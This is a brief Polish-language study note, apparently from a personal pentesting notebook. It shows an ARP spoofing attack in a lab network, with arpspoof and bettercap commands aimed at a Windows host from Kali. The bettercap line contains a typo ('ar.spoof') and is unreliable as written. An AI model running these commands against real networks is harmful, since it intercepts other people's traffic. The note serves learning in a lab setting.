---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# ARP spoof

**Win** 10.0.2.15

wylistowuje tablicę ARP

```
arp -a
```

**Kali** 10.0.2.17

podajemy najpierw ip windowsa którego atakujemy a potem default gateway

```
arpspoof -i eth0 -t 10.0.2.15 10.0.2.1
```

bettercap

```
bettercap -eval "set arp.spoof 10.0.2.15; ar.spoof on"
```
